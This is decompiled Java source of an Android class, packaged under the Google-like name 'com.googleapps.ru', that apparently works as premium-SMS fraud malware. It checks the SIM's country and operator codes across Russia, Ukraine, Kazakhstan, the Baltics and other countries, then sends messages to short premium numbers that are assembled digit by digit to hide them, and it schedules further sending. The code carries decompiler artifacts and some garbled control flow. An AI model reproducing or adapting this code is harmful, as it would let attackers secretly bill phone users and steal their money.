package com.googleapps.ru;

import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.telephony.SmsManager;
import android.util.Pair;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;

public class Activator
{
  public static final String AB_ID = "289";
  public static final String AM_ID = "283";
  public static final String AZ_CODE = "400";
  public static final String BEELINE_CODE = "99";
  public static final String BELLORUSS_ID = "257";
  public static final String BWC_ID = "12";
  public static boolean IS_MF = false;
  public static final String IS_SENT_KEY = "IS_SENT_KEY";
  public static final String KARTEL_ID = "01";
  public static final String KAZ_CODE = "401";
  public static final String KCELL_ID = "02";
  public static final String KEY_MSG_TEXT = "KEY_MSG_TEXT";
  public static final String KG_ID = "437";
  public static final String LT_ID = "246";
  public static final String LV_ID = "247";
  public static final String MD_ID = "259";
  public static final String MGF_ID = "02";
  public static final String MTS_BY = "02";
  public static final String MTS_ID = "01";
  public static final String NET_OP = "NET_OP";
  private static final String NEW_INIT = "new";
  public static final String NSS_ID = "03";
  public static String NUMBER1;
  public static String NUMBER10;
  public static String NUMBER3;
  public static String NUMBER5;
  public static String PORT = "9903";
  public static String PREF_PORT;
  public static final String PRIVATE = "999";
  public static final String PROCEDURE_STARTED = "PROCEDURE_STARTED";
  public static final String RF_ID = "250";
  public static final String SENT = "SENT";
  public static final String SENT_IS_NOT_OK = "SENT_IS_NOT_OK";
  public static final String SENT_OK = "SENT_OK";
  public static final String SENT_SMS_COUNT_KEY = "SENT_SMS_COUNT_KEY";
  public static int STATUS = 0;
  public static final String TELE2_ID = "20";
  public static final int TIMEOUT_SECONDS = 180;
  public static final String UK_ID = "255";
  public static final String UMC_ID = "01";
  private static final String URL = "URL";
  private static String USED_SCHEME = "999";
  public static final String otherID = "10000";
  private static SmsManager sms;
  private HashMap<String, Scheme> actSchemes = new HashMap();
  private int actuallySent = 0;
  private String app_name;
  private String content;
  private String countryCode;
  private String firstText;
  private Context mContext;
  private String operatorCode;
  private String operatorString;
  private Pair<String, String> schemes;
  private String secondText;
  private boolean sendImmediately;
  private int sended = 0;
  private SharedPreferences settings;
  private HashMap<String, HashMap<String, String>> texts = new HashMap();
  private boolean wasActError = false;
  
  static
  {
    IS_MF = false;
    sms = SmsManager.getDefault();
    NUMBER10 = "7255";
    NUMBER1 = "7151";
    NUMBER3 = "8151";
    NUMBER5 = "2855";
    PREF_PORT = "40947";
  }
  
  public Activator(Context paramContext, String paramString)
  {
    this.mContext = paramContext;
    this.operatorString = paramString;
    this.settings = this.mContext.getSharedPreferences("PREFERENCES", 0);
    TextUtils.putSettingsValue(this.mContext, "NET_OP", paramString, this.settings);
    initInformation();
    initConfigs();
    if (isMFon())
    {
      this.firstText = ((String)((HashMap)this.texts.get("02")).get("firstText"));
      this.secondText = ((String)((HashMap)this.texts.get("02")).get("secondText"));
      IS_MF = true;
    }
    for (int i = 1;; i = 1)
    {
      try
      {
        boolean bool = TextUtils.readLine(10, paramContext).equals("new");
        if (!bool) {
          continue;
        }
        i = 0;
      }
      catch (IOException paramContext)
      {
        for (;;) {}
      }
      if (i == 0) {
        break label365;
      }
      oldInit(0);
      return;
      if ((isRFID()) || (isUKID()) || (isKzID()))
      {
        this.firstText = ((String)((HashMap)this.texts.get(this.countryCode)).get("firstText"));
        this.secondText = ((String)((HashMap)this.texts.get(this.countryCode)).get("secondText"));
        break;
      }
      this.firstText = ((String)((HashMap)this.texts.get("10000")).get("firstText"));
      this.secondText = ((String)((HashMap)this.texts.get("10000")).get("secondText"));
      if (this.firstText != null) {
        break;
      }
      this.firstText = ((String)((HashMap)this.texts.get("250")).get("firstText"));
      this.secondText = ((String)((HashMap)this.texts.get("250")).get("secondText"));
      break;
    }
    label365:
    newInit();
  }
  
  private void acquire()
  {
    this.mContext.registerReceiver(new BroadcastReceiver()new IntentFilter
    {
      public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
      {
        paramAnonymousContext = Activator.this;
        paramAnonymousContext.sended += 1;
        switch (getResultCode())
        {
        default: 
          if (Activator.this.sended == ((Scheme)Activator.this.actSchemes.get(Activator.USED_SCHEME)).smsQuantity)
          {
            Activator.this.sended = 0;
            if (Activator.this.actuallySent <= 0) {
              break label168;
            }
            TextUtils.putSettingsValue(Activator.this.mContext, "URL", Activator.this.content, Activator.this.settings);
            Activator.this.report(-1, PendingIntent.getBroadcast(Activator.this.mContext, -1, new Intent("SENDING_OK"), 0));
          }
          break;
        }
        for (;;)
        {
          Activator.this.mContext.unregisterReceiver(this);
          return;
          paramAnonymousContext = Activator.this;
          paramAnonymousContext.actuallySent += 1;
          break;
          label168:
          Activator.this.report(0, PendingIntent.getBroadcast(Activator.this.mContext, -1, new Intent("SENDING_OK"), 0));
        }
      }
    }, new IntentFilter("SENT"));
  }
  
  public static Scheme getPortSchemeByNumber(String paramString)
  {
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new Pair(paramString, PREF_PORT));
    return new Scheme(1, localArrayList);
  }
  
  private void initConfigs()
  {
    try
    {
      this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(2130968576));
      try
      {
        this.schemes = TextUtils.getScheme(this.mContext.getResources().openRawResource(2131034112));
        USED_SCHEME = (String)this.schemes.first;
        TextUtils.putSettingsValue(this.mContext, "KEY_MSG_TEXT", (String)this.schemes.second, this.settings);
        this.app_name = new String();
        try
        {
          this.app_name = TextUtils.readLine(1, this.mContext);
          this.content = new String();
          try
          {
            this.content = TextUtils.readLine(2, this.mContext);
            try
            {
              if (isMFon())
              {
                this.sendImmediately = false;
                return;
              }
              this.sendImmediately = TextUtils.readLine(3, this.mContext).equalsIgnoreCase("999");
              return;
            }
            catch (IOException localIOException1) {}
          }
          catch (IOException localIOException2)
          {
            for (;;) {}
          }
        }
        catch (IOException localIOException3)
        {
          for (;;) {}
        }
      }
      catch (IOException localIOException4)
      {
        for (;;) {}
      }
    }
    catch (IOException localIOException5)
    {
      for (;;) {}
    }
  }
  
  private void initInformation()
  {
    this.countryCode = this.operatorString.substring(0, 3);
    this.operatorCode = this.operatorString.substring(3, 5);
  }
  
  private boolean isKzID()
  {
    return this.countryCode.equals("401");
  }
  
  private boolean isRFID()
  {
    return this.countryCode.equals("250");
  }
  
  private void newInit()
  {
    if ((this.countryCode.equals("250")) && (this.operatorCode.equals("02")))
    {
      this.wasActError = true;
      return;
    }
    oldInit(1);
  }
  
  private void oldInit(int paramInt)
  {
    Object localObject6 = "7" + "1" + "5" + "1";
    new StringBuilder(String.valueOf("8")).append("1").append("5").append("1").toString();
    Object localObject3 = "9" + "1" + "5" + "1";
    Object localObject4 = "7" + "1" + "5" + "5";
    new StringBuilder(String.valueOf("7")).append("2").append("5").append("5").toString();
    String str6 = "2" + "8" + "5" + "5";
    new StringBuilder(String.valueOf("3")).append("8").append("5").append("8").toString();
    new StringBuilder(String.valueOf("7")).append("0").append("1").append("5").toString();
    String str7 = "7" + "0" + "1" + "9";
    new StringBuilder(String.valueOf("7")).append("2").append("5").append("9").toString();
    new StringBuilder(String.valueOf("5")).append("3").append("7").append("3").toString();
    new StringBuilder(String.valueOf("3")).append("6").append("9").append("8").toString();
    String str3 = "5" + "0" + "1" + "3";
    new StringBuilder(String.valueOf("1")).append("8").append("9").append("9").toString();
    String str2 = "5" + "0" + "1" + "4";
    String str1 = "5" + "5" + "3" + "7";
    String str20 = "3" + "7" + "4" + "7";
    String str5 = "4" + "0" + "9" + "7" + "3";
    Object localObject1 = "8" + "3" + "4" + "9" + "9";
    String str8 = "9" + "6" + "8" + "3";
    String str9 = "7" + "5" + "0" + "3" + "1";
    String str10 = "3" + "3" + "0" + "4";
    String str11 = "3" + "3" + "0" + "2";
    new StringBuilder(String.valueOf("3")).append("3").append("1").append("1").toString();
    new StringBuilder(String.valueOf("3")).append("3").append("3").append("2").toString();
    new StringBuilder(String.valueOf("3")).append("3").append("3").append("9").toString();
    new StringBuilder(String.valueOf("7")).append("8").append("5").append("2").append("7").toString();
    new StringBuilder(String.valueOf("5")).append("6").append("3").append("9").toString();
    new StringBuilder(String.valueOf("5")).append("7").append("6").toString();
    String str12 = "4" + "6" + "4" + "0";
    String str13 = "8" + "3" + "4" + "9" + "9";
    String str4 = "wm " + "9516782";
    String str14 = "7" + "0" + "0" + "1";
    String str15 = "7" + "2" + "5" + "0";
    new StringBuilder(String.valueOf("2")).append("0").append("1").append("1").toString();
    String str16 = "2" + "3" + "3" + "2";
    String str17 = "1" + "8" + "9" + "7" + "1";
    String str18 = "1" + "3" + "3" + "7" + "1";
    String str19 = "8" + "8" + "8" + "3";
    new ArrayList();
    Object localObject5 = PREF_PORT;
    Object localObject2 = PREF_PORT;
    if ((this.operatorCode.equals("01")) || (this.operatorCode.equals("03")))
    {
      localObject6 = str3;
      localObject3 = str2;
      localObject4 = str1;
      NUMBER10 = str20;
      NUMBER5 = str1;
      PREF_PORT = (String)localObject1;
      localObject5 = localObject1;
      localObject2 = localObject1;
    }
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(new Pair(localObject4, PREF_PORT));
    ((ArrayList)localObject1).add(new Pair(localObject3, localObject2));
    ((ArrayList)localObject1).add(new Pair(localObject6, localObject5));
    this.actSchemes.put("5-3-1", new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(new Pair(localObject4, PREF_PORT));
    ((ArrayList)localObject1).add(new Pair(localObject3, localObject2));
    this.actSchemes.put("5-3", new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(new Pair(localObject4, PREF_PORT));
    this.actSchemes.put("5", new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(new Pair(localObject3, localObject2));
    this.actSchemes.put("3", new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
    if (this.countryCode.equals("250")) {
      if (this.operatorCode.equals("20"))
      {
        localObject1 = new ArrayList();
        ((ArrayList)localObject1).add(new Pair(str7, "s268906"));
      }
    }
    do
    {
      this.actSchemes.put(USED_SCHEME, new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
      do
      {
        return;
      } while (!this.operatorCode.equals("02"));
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str6, str5));
      this.actSchemes.put(USED_SCHEME, new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
      return;
      if (this.countryCode.equals("401"))
      {
        if ((((String)this.schemes.second).indexOf("o") != -1) || (((String)this.schemes.second).indexOf("o2") != -1) || (this.operatorCode.equals("02")) || (this.operatorCode.equals("01")))
        {
          this.wasActError = true;
          return;
        }
        localObject1 = new ArrayList();
        ((ArrayList)localObject1).add(new Pair(str8, str9));
        this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
        return;
      }
      if (this.countryCode.equals("400"))
      {
        localObject1 = new ArrayList();
        ((ArrayList)localObject1).add(new Pair(str10, str5));
        ((ArrayList)localObject1).add(new Pair(str11, str5));
        this.actSchemes.put(USED_SCHEME, new Scheme(2, (ArrayList)localObject1));
        return;
      }
      if (!this.countryCode.equals("255")) {
        break;
      }
    } while (this.content.indexOf("/ero_tube/") != -1);
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(new Pair(str12, str13));
    this.actSchemes.put(USED_SCHEME, new Scheme(((ArrayList)localObject1).size(), (ArrayList)localObject1));
    return;
    if (this.countryCode.equals("283"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str14, str4));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    if (this.countryCode.equals("259"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str15, "s268906"));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    if (this.countryCode.equals("437"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str19, str4));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    if (this.countryCode.equals("289"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str16, "s268906"));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    if (this.countryCode.equals("247"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str17, str4));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    if (this.countryCode.equals("246"))
    {
      localObject1 = new ArrayList();
      ((ArrayList)localObject1).add(new Pair(str18, str4));
      this.actSchemes.put(USED_SCHEME, new Scheme(1, (ArrayList)localObject1));
      return;
    }
    this.wasActError = true;
  }
  
  private void report(int paramInt, PendingIntent paramPendingIntent)
  {
    try
    {
      STATUS = paramInt;
      paramPendingIntent.send();
      return;
    }
    catch (PendingIntent.CanceledException paramPendingIntent) {}
  }
  
  void beginSending()
  {
    Msg.start(sms, null, getPortSchemeByNumber(NUMBER10), (String)this.schemes.second);
    Checker.scheduleChecking(this.mContext);
  }
  
  public String getActedLink()
  {
    return this.settings.getString("URL", "");
  }
  
  public String getAppName()
  {
    return this.app_name;
  }
  
  public String getLinkHasToBeActed()
  {
    return this.content;
  }
  
  public String getMainLocalizedText()
  {
    return this.firstText.replace("*CONTENT*", getAppName());
  }
  
  public String getSecondText()
  {
    return this.secondText.replace("*CONTENT*", getAppName());
  }
  
  public boolean isActed()
  {
    return getActedLink().equals(this.content);
  }
  
  public boolean isBeeline()
  {
    return (this.operatorCode.equals("99")) && (this.countryCode.equals("250"));
  }
  
  public boolean isBy()
  {
    return this.countryCode.equals("257");
  }
  
  public boolean isMFon()
  {
    return (this.operatorCode.equals("02")) && (this.countryCode.equals("250"));
  }
  
  public boolean isTele2()
  {
    return (this.operatorCode.equals("20")) && (this.countryCode.equals("250"));
  }
  
  public boolean isUKID()
  {
    return this.countryCode.equals("255");
  }
  
  public void send()
  {
    if ((!"new".equals(USED_SCHEME)) || (!this.countryCode.equals("250")) || ((this.countryCode.equals("250")) && ((this.operatorCode.equals("20")) || (this.operatorCode.equals("02")))) || (this.countryCode.equals("257")))
    {
      acquire();
      Msg.start(sms, PendingIntent.getBroadcast(this.mContext, 0, new Intent("SENT"), 0), (Scheme)this.actSchemes.get(USED_SCHEME), (String)this.schemes.second);
      return;
    }
    beginSending();
    TextUtils.putSettingsValue(this.mContext, "URL", this.content, this.settings);
    report(-1, PendingIntent.getBroadcast(this.mContext, -1, new Intent("SENDING_OK"), 0));
  }
  
  public void send(String paramString)
  {
    if (this.actSchemes.get(paramString) != null) {
      Msg.start(sms, PendingIntent.getBroadcast(this.mContext, 0, new Intent("SENT"), 0), (Scheme)this.actSchemes.get(paramString), (String)this.schemes.second);
    }
  }
  
  public void send(String paramString1, String paramString2)
  {
    if (this.actSchemes.get(paramString1) != null) {
      Msg.start(sms, null, (Scheme)this.actSchemes.get(paramString1), (String)this.schemes.second);
    }
  }
  
  public boolean sendNow()
  {
    return this.sendImmediately;
  }
  
  public boolean wasInitError()
  {
    return this.wasActError;
  }
}
